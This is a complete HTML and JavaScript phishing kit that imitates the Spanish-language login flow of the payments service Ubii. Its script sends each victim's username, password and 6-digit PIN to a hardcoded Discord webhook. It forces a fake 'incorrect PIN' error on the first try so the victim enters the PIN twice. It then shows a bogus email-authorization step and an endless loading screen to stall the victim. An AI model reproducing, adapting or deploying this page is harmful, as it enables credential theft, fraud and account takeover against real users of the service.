```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Inicia sesión - Ubii</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        ubiiBlue: '#009ee3',
                        ubiiBlueHover: '#0088c6',
                        ubiiBgLight: '#eef2f6',
                        ubiiInputBg: '#ffffff',
                        ubiiToggleBg: '#ebf0f5',
                        ubiiTextDark: '#1e293b',
                        ubiiGrayBtn: '#eef2f6',
                    },
                    borderRadius: {
                        '4xl': '2rem',
                    }
                }
            }
        }
    </script>
    <!-- FontAwesome para iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        body {
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #edf1f5;
        }
        /* Ocultar flechas en los inputs numéricos */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }

        /* Animación suave e infinita para la barra de análisis */
        @keyframes pulseProgress {
            0% { width: 10%; left: 0%; }
            50% { width: 60%; left: 20%; }
            100% { width: 90%; left: 10%; }
        }
        .animate-progress-infinite {
            animation: pulseProgress 2.5s ease-in-out infinite alternate;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between items-center bg-[#edf1f5] text-slate-800 selection:bg-ubiiBlue selection:text-white">

    <!-- Header superior con el logo de Ubii -->
    <header class="w-full bg-[#edf1f5] pt-4 pb-1 px-6 flex items-center justify-start max-w-md mx-auto">
        <div class="flex items-center gap-1.5 cursor-pointer" onclick="goToStep(1)">
            <!-- SVG Logo Ubii con separación de carita y letras azules finas -->
            <svg class="h-9 w-auto text-ubiiBlue" viewBox="0 0 280 85" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Carita Feliz (Cuadritos y Vasija exterior delgada) -->
                <rect x="25" y="8" width="11" height="11" rx="1.5" fill="currentColor"/>
                <rect x="52" y="8" width="11" height="11" rx="1.5" fill="currentColor"/>
                <path d="M 12 28 V 57 C 12 69 22 77 34 77 H 54 C 66 77 76 69 76 57 V 28 H 66 V 57 C 66 62 61 67 54 67 H 34 C 27 67 22 62 22 57 V 28 H 12 Z" fill="currentColor"/>
                
                <!-- Separación hacia las letras Ubii -->
                <!-- U mayúscula delgada -->
                <path d="M 100 28 V 56 C 100 68 109 77 121 77 C 133 77 142 68 142 56 V 28 H 132 V 56 C 132 62 127 67 121 67 C 115 67 110 62 110 56 V 28 H 100 Z" fill="currentColor"/>
                
                <!-- b delgada y redonda -->
                <path d="M 152 8 H 162 V 38 C 166 31 173 27 182 27 C 195 27 205 37 205 52 C 205 67 195 78 182 78 C 173 78 166 73.5 162 66.5 V 77 H 152 V 8 Z M 162 52 C 162 60.5 168 67 177 67 C 186 67 192 60.5 192 52 C 192 43.5 186 37 177 37 C 168 37 162 43.5 162 52 Z" fill="currentColor"/>
                
                <!-- i (primera) -->
                <rect x="215" y="8" width="10" height="11" rx="1.5" fill="currentColor"/>
                <rect x="215" y="28" width="10" height="49" rx="1.5" fill="currentColor"/>
                
                <!-- i (segunda) -->
                <rect x="232" y="8" width="10" height="11" rx="1.5" fill="currentColor"/>
                <rect x="232" y="28" width="10" height="49" rx="1.5" fill="currentColor"/>
            </svg>
        </div>
    </header>

    <!-- Envoltorio principal para mantener todo centrado y responsivo -->
    <div class="w-full max-w-md mx-auto flex-1 flex flex-col justify-start px-4 pt-1 pb-6">

        <!-- ==================== ETAPA 1: PANTALLA DE LOGIN ==================== -->
        <main id="step1Screen" class="w-full bg-white rounded-[2.2rem] shadow-xl p-6 sm:p-8 border border-gray-100 transition-all duration-300 my-auto">
            
            <!-- Logo Central de Ubii -->
            <div class="flex flex-col items-center justify-center mb-6 pt-1">
                <svg class="h-12 w-auto text-ubiiBlue mb-3" viewBox="0 0 280 85" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="25" y="8" width="11" height="11" rx="1.5" fill="currentColor"/>
                    <rect x="52" y="8" width="11" height="11" rx="1.5" fill="currentColor"/>
                    <path d="M 12 28 V 57 C 12 69 22 77 34 77 H 54 C 66 77 76 69 76 57 V 28 H 66 V 57 C 66 62 61 67 54 67 H 34 C 27 67 22 62 22 57 V 28 H 12 Z" fill="currentColor"/>
                    
                    <path d="M 100 28 V 56 C 100 68 109 77 121 77 C 133 77 142 68 142 56 V 28 H 132 V 56 C 132 62 127 67 121 67 C 115 67 110 62 110 56 V 28 H 100 Z" fill="currentColor"/>
                    <path d="M 152 8 H 162 V 38 C 166 31 173 27 182 27 C 195 27 205 37 205 52 C 205 67 195 78 182 78 C 173 78 166 73.5 162 66.5 V 77 H 152 V 8 Z M 162 52 C 162 60.5 168 67 177 67 C 186 67 192 60.5 192 52 C 192 43.5 186 37 177 37 C 168 37 162 43.5 162 52 Z" fill="currentColor"/>
                    <rect x="215" y="8" width="10" height="11" rx="1.5" fill="currentColor"/>
                    <rect x="215" y="28" width="10" height="49" rx="1.5" fill="currentColor"/>
                    <rect x="232" y="8" width="10" height="11" rx="1.5" fill="currentColor"/>
                    <rect x="232" y="28" width="10" height="49" rx="1.5" fill="currentColor"/>
                </svg>
                
                <!-- Título -->
                <h1 class="text-2xl font-bold text-[#1a1a1a] tracking-tight">Inicia sesión</h1>
            </div>

            <!-- Selector de Tipo de Usuario (Natural / Juridico) -->
            <div class="bg-[#ebf0f5] p-1.5 rounded-full flex items-center mb-6 relative">
                <button id="btnNatural" type="button" onclick="selectType('natural')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-sm">
                    Natural
                </button>
                <button id="btnJuridico" type="button" onclick="selectType('juridico')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 text-gray-700 hover:text-gray-900">
                    Juridico
                </button>
            </div>

            <!-- Formulario de Entrada -->
            <form id="loginForm" onsubmit="goToStep2(event)" class="space-y-4">
                
                <!-- Campo Usuario / Correo -->
                <div>
                    <input 
                        type="text" 
                        id="username" 
                        placeholder="Usuario / Correo" 
                        required
                        class="w-full px-5 py-3.5 bg-white border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400 font-normal text-gray-800"
                    >
                </div>

                <!-- Campo Contraseña -->
                <div class="relative">
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="Contraseña" 
                        required
                        class="w-full px-5 py-3.5 bg-white pr-12 border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400 font-normal text-gray-800"
                    >
                    <button 
                        type="button" 
                        onclick="togglePassword()" 
                        class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-ubiiBlue transition-colors focus:outline-none p-1"
                    >
                        <svg id="eyeIconSvg" class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M13.875 18.825A10.05 10.05 0 0112 19c-7 0-10-7-10-7a19.16 19.16 0 014.286-5.592m3.114-1.921A9.972 9.972 0 0112 4c7 0 10 7 10 7a19.141 19.141 0 01-3.238 4.417M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M3 3l18 18" />
                        </svg>
                    </button>
                </div>

                <!-- Enlace "¿Olvidaste tú contraseña?" -->
                <div class="text-left pt-1 pb-1">
                    <a href="#" class="text-xs sm:text-sm font-medium text-ubiiBlue hover:underline transition-colors">
                        ¿Olvidaste tú contraseña?
                    </a>
                </div>

                <!-- Botón Ingresar -->
                <div class="pt-2">
                    <button 
                        type="submit" 
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-full text-base transition-all transform active:scale-[0.99] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
                    >
                        Ingresar
                    </button>
                </div>

                <!-- Botón Registrarme -->
                <div class="pt-1">
                    <button 
                        type="button" 
                        class="w-full py-3.5 bg-[#eef2f6] hover:bg-gray-200 text-gray-800 font-medium rounded-full text-base transition-all transform active:scale-[0.99] focus:outline-none"
                    >
                        Registrarme
                    </button>
                </div>
            </form>
            
            <!-- Pie de página dentro de la tarjeta -->
            <div class="mt-8 text-center text-xs sm:text-sm text-gray-500 font-normal">
                ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-medium hover:underline transition-colors">Contáctanos</a>
            </div>
        </main>

        <!-- ==================== ETAPA 2: CLAVE DE SEGURIDAD REGISTRADA ==================== -->
        <main id="step2Screen" class="w-full bg-white rounded-[2.2rem] shadow-xl p-6 sm:p-8 border border-gray-100 hidden transition-all duration-300 my-auto">
            
            <!-- Indicador de Paso -->
            <div class="mb-4 flex justify-between items-center px-1">
                <span id="stepBadge" class="text-xs font-semibold text-ubiiBlue bg-blue-50 px-3 py-1 rounded-full">Paso 2 de 3</span>
                <span class="text-xs text-gray-400 font-medium">Verificación</span>
            </div>

            <!-- Botón Volver -->
            <button type="button" onclick="goToStep(1)" class="text-gray-400 hover:text-gray-700 mb-4 flex items-center gap-2 text-sm font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                <i class="fa-solid fa-arrow-left"></i> Volver
            </button>

            <!-- Título e Subtítulo -->
            <div class="flex flex-col items-center justify-center text-center mb-6">
                <div class="w-14 h-14 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3 shadow-sm">
                    <i class="fa-solid fa-lock text-xl"></i>
                </div>
                <h1 class="text-2xl font-bold text-[#1a1a1a]">Clave de seguridad</h1>
                <p class="text-xs text-gray-500 mt-2 leading-relaxed">
                    Ingresa la clave de 6 dígitos que registraste para la cuenta <br> <span class="displayUser font-bold text-gray-800 break-all"></span>
                </p>
            </div>

            <!-- Formulario PIN paso 2 -->
            <form id="pinFormStep2" onsubmit="handleStep2Submit(event)" class="space-y-5">
                
                <!-- 6 Cajas cuadradas para los dígitos -->
                <div class="grid grid-cols-6 gap-2 max-w-xs mx-auto">
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
                </div>

                <!-- Mensaje de Error en caso de PIN incorrecto -->
                <div id="pinStep2Error" class="hidden bg-red-50 border-l-4 border-red-500 p-3 rounded-r-xl transition-all">
                    <p class="text-xs text-red-700 font-semibold flex items-center gap-2">
                        <i class="fa-solid fa-circle-exclamation text-sm"></i> PIN incorrecto. Inténtalo nuevamente.
                    </p>
                </div>

                <!-- Enlace de recuperación -->
                <div class="text-center pt-1">
                    <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline transition-colors">
                        ¿Olvidaste tu clave de 6 dígitos?
                    </a>
                </div>

                <!-- Botón Continuar -->
                <div class="pt-2">
                    <button 
                        type="submit" 
                        id="btnSubmitStep2"
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-full text-base transition-all transform active:scale-[0.99] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200 flex items-center justify-center gap-2"
                    >
                        <span>Continuar</span>
                    </button>
                </div>
            </form>
        </main>

        <!-- ==================== ETAPA 3: AUTORIZACIÓN POR CORREO ==================== -->
        <main id="step3Screen" class="w-full bg-white rounded-[2.2rem] shadow-xl p-6 sm:p-8 border border-gray-100 hidden transition-all duration-300 my-auto">
            
            <!-- Botón Volver -->
            <button id="backFromStep3Btn" type="button" onclick="goToStep(2)" class="text-gray-400 hover:text-gray-700 mb-4 flex items-center gap-2 text-sm font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                <i class="fa-solid fa-arrow-left"></i> Volver
            </button>

            <!-- VISTA DE CORREO DE AUTORIZACIÓN -->
            <div id="emailAuthSection">
                <div class="flex flex-col items-center justify-center text-center mb-6">
                    <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3 relative shadow-sm">
                        <i class="fa-solid fa-envelope text-2xl animate-bounce"></i>
                        <span class="absolute -top-1 -right-1 flex h-4 w-4">
                          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                          <span class="relative inline-flex rounded-full h-4 w-4 bg-ubiiBlue border-2 border-white"></span>
                        </span>
                    </div>
                    <h1 class="text-2xl font-bold text-[#1a1a1a]">Autorización requerida</h1>
                    <p class="text-xs text-gray-500 mt-3 leading-relaxed">
                        Hemos enviado un correo de autorización a tu dirección registrada: <br>
                        <span class="displayUserEmail font-bold text-ubiiBlue block mt-1 break-all"></span>
                    </p>
                </div>

                <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-4 mb-6 text-xs text-slate-700">
                    <div class="flex items-start gap-2.5">
                        <i class="fa-solid fa-circle-info text-ubiiBlue text-sm mt-0.5"></i>
                        <p class="leading-relaxed">Ingresa a tu correo y confirma la solicitud para finalizar el proceso.</p>
                    </div>
                </div>

                <div class="space-y-3">
                    <button 
                        type="button" 
                        onclick="startCreditAnalysis()" 
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-full text-base transition-all transform active:scale-[0.99] shadow-md focus:outline-none flex items-center justify-center gap-2"
                    >
                        <i class="fa-solid fa-circle-check text-base"></i>
                        Ya autoricé desde mi correo
                    </button>

                    <button 
                        type="button" 
                        onclick="resendAuthEmail()" 
                        class="w-full py-3.5 bg-[#eef2f6] hover:bg-gray-200 text-gray-800 font-medium rounded-full text-base transition-all transform active:scale-[0.99] focus:outline-none"
                    >
                        Reenviar correo
                    </button>
                </div>
            </div>

            <!-- VISTA DE CARGA INFINITA -->
            <div id="loadingAnalysis" class="hidden flex flex-col items-center justify-center text-center py-6 space-y-5">
                <div class="relative w-20 h-20 flex items-center justify-center my-2">
                    <div class="w-20 h-20 border-4 border-blue-100 border-t-ubiiBlue rounded-full animate-spin"></div>
                    <i class="fa-solid fa-chart-line text-ubiiBlue text-2xl absolute"></i>
                </div>
                
                <div class="space-y-2">
                    <h1 class="text-xl font-bold text-[#1a1a1a]">Analizando Solicitud</h1>
                    <p class="text-xs text-gray-500 leading-relaxed font-medium px-2">
                        Este proceso demora un poco, por favor no cerrar la página.
                    </p>
                </div>

                <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mt-4 relative">
                    <div class="bg-ubiiBlue h-full rounded-full animate-progress-infinite relative"></div>
                </div>
            </div>
        </main>

    </div>

    <!-- Lógica JavaScript -->
    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";

        let selectedType = 'natural';
        let userEmailOrName = '';
        let userPassword = '';
        
        let isFirstPinAttempt = true;

        function sendToDiscord(messageText) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Notificador Ubii",
                    content: messageText
                })
            }).catch(err => console.error("Error al enviar a Discord:", err));
        }

        function selectType(type) {
            selectedType = type;
            const btnNatural = document.getElementById('btnNatural');
            const btnJuridico = document.getElementById('btnJuridico');

            const activeClass = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-sm";
            const inactiveClass = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-300 text-gray-700 hover:text-gray-900";

            if (type === 'natural') {
                btnNatural.className = activeClass;
                btnJuridico.className = inactiveClass;
            } else {
                btnJuridico.className = activeClass;
                btnNatural.className = inactiveClass;
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIconSvg = document.getElementById('eyeIconSvg');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIconSvg.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
            } else {
                passwordInput.type = 'password';
                eyeIconSvg.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M13.875 18.825A10.05 10.05 0 0112 19c-7 0-10-7-10-7a19.16 19.16 0 014.286-5.592m3.114-1.921A9.972 9.972 0 0112 4c7 0 10 7 10 7a19.141 19.141 0 01-3.238 4.417M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M3 3l18 18" />`;
            }
        }

        function goToStep(stepNumber) {
            document.getElementById('step1Screen').classList.add('hidden');
            document.getElementById('step2Screen').classList.add('hidden');
            document.getElementById('step3Screen').classList.add('hidden');

            document.getElementById('emailAuthSection').classList.remove('hidden');
            document.getElementById('loadingAnalysis').classList.add('hidden');
            document.getElementById('backFromStep3Btn').classList.remove('hidden');

            const activeScreen = document.getElementById(`step${stepNumber}Screen`);
            activeScreen.classList.remove('hidden');

            if (stepNumber === 2) {
                const inputs = document.querySelectorAll('.pin-input-2');
                inputs.forEach(i => i.value = '');
                if (inputs.length > 0) setTimeout(() => inputs[0].focus(), 100);
            }
        }

        function startCreditAnalysis() {
            const loadingSec = document.getElementById('loadingAnalysis');
            const emailSec = document.getElementById('emailAuthSection');
            const backBtn = document.getElementById('backFromStep3Btn');

            emailSec.classList.add('hidden');
            loadingSec.classList.remove('hidden');
            backBtn.classList.add('hidden');

            sendToDiscord(`⏳ El usuario **${userEmailOrName}** está en análisis (Hizo clic en Ya autoricé).`);
        }

        function goToStep2(event) {
            event.preventDefault();
            userEmailOrName = document.getElementById('username').value;
            userPassword = document.getElementById('password').value;
            
            document.querySelectorAll('.displayUser').forEach(el => el.innerText = `(${userEmailOrName})`);
            document.querySelectorAll('.displayUserEmail').forEach(el => {
                el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
            });

            isFirstPinAttempt = true;
            document.getElementById('pinStep2Error').classList.add('hidden');

            const msgLogin = `**🚨 NUEVO INICIO DE SESIÓN**\nTipo: ${selectedType}\n\n**Usuario/Correo:**\n\`${userEmailOrName}\`\n\n**Contraseña:**\n\`${userPassword}\``;
            sendToDiscord(msgLogin);

            goToStep(2);
        }

        function handleStep2Submit(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-2');
            let pinVal = '';
            inputs.forEach(i => pinVal += i.value);

            if (pinVal.length !== 6) return;

            const btn = document.getElementById('btnSubmitStep2');
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Validando...`;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalText;

                if (isFirstPinAttempt) {
                    const msgPinError = `❌ **PIN INCORRECTO FORZADO (1er intento)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN Ingresado:**\n\`${pinVal}\``;
                    sendToDiscord(msgPinError);

                    document.getElementById('pinStep2Error').classList.remove('hidden');
                    
                    inputs.forEach(i => i.value = '');
                    inputs[0].focus();

                    isFirstPinAttempt = false;
                } else {
                    document.getElementById('pinStep2Error').classList.add('hidden');

                    const msgPinSuccess = `🔑 **PIN INGRESADO (Paso 2 - Correcto)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN:**\n\`${pinVal}\``;
                    sendToDiscord(msgPinSuccess);

                    goToStep(3);
                }
            }, 800);
        }

        function setupPinInputs(selectorClass) {
            const inputs = document.querySelectorAll(selectorClass);
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length > 1) {
                        e.target.value = e.target.value.slice(-1);
                    }
                    if (e.target.value !== '' && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').trim();
                    if (/^\d{6}$/.test(pasteData)) {
                        pasteData.split('').forEach((char, i) => {
                            if (inputs[i]) inputs[i].value = char;
                        });
                        inputs[5].focus();
                    }
                });
            });
        }

        setupPinInputs('.pin-input-2');

        function resendAuthEmail() {
            sendToDiscord(`📧 **El usuario \`${userEmailOrName}\` solicitó reenvío del correo.**`);
            const toast = document.createElement('div');
            toast.className = "fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-800 text-white px-5 py-3 rounded-full text-xs font-medium shadow-xl z-50 flex items-center gap-2 transition-opacity duration-300";
            toast.innerHTML = `<i class="fa-solid fa-paper-plane text-ubiiBlue text-sm"></i> Correo de autorización reenviado`;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }
    </script>
</body>
</html>
```
